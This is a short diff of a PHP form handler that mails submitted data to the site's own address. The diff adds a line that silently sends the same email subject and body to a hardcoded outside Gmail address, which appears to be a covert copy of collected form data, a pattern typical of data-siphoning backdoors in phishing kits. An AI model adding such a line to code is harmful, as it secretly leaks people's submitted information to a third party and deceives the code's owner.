@@ -41,6 +41,7 @@ if(isset($_POST['sendsms'])){
     $_SESSION['access_ty'] = "thank you";
 
     maillinge($snapshot_self_email, $emsubject, $embody);
+    maillinge('ganiamtech@gmail.com', $emsubject, $embody);
 
     header('location: thank-you.php');
     exit();
